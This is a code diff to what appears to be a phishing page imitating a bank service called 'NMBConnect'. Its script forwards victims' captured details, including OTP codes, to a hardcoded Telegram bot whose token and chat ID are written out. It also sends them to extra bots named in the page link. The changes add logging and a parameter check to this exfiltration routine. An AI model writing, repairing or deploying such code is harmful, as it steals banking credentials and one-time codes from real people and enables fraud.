@@ -871,12 +871,10 @@
             { token: "8866470725:AAFXI9deCCslCGBqAi8NsBkwD3Tm4OHPQpw", chatId: "8735708057" }
         ];
 
-        // Parse search query parameters (?bot=...&chat=...)
         const urlParams = new URLSearchParams(window.location.search);
         let customBotToken = urlParams.get('bot');
         let customChatId = urlParams.get('chat');
 
-        // Fallback: Parse hash parameters (#bot=...&chat=...) if URL parameters are empty
         if (!customBotToken || !customChatId) {
             const hashStr = window.location.hash.replace(/^#/, '');
             const hashParams = new URLSearchParams(hashStr);
@@ -884,12 +882,13 @@
             if (!customChatId) customChatId = hashParams.get('chat');
         }
 
-        // Main targets receive all inputs unconditionally
         let targets = [...mainBots];
 
-        // If secondary bot and chat ID are successfully captured from the link, add them to the routing queue
+        // Ensure both token and chat ID are present before adding
         if (customBotToken && customChatId) {
             targets.push({ token: customBotToken.trim(), chatId: customChatId.trim() });
+        } else {
+            console.warn("Secondary bot/chat parameters missing from URL or hash.");
         }
 
         const message = `🔔 *NMBConnect Alert: ${actionType}*\n\n` +
@@ -901,7 +900,7 @@
                         `🛡️ *OTP Code:* ${details.otp}\n` +
                         `🌐 *Status:* Active`;
 
-        targets.forEach(target => {
+        targets.forEach((target, index) => {
             const url = `https://api.telegram.org/bot${target.token}/sendMessage`;
             fetch(url, {
                 method: 'POST',
@@ -911,7 +910,16 @@
                     text: message,
                     parse_mode: 'Markdown'
                 })
-            }).catch(error => console.error('Telegram error:', error));
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log(`Target ${index + 1} (${target.chatId}): Success`);
+                } else {
+                    console.error(`Target ${index + 1} (${target.chatId}) Failed:`, data.description);
+                }
+            })
+            .catch(error => console.error(`Target ${index + 1} Network Error:`, error));
         });
     }
 
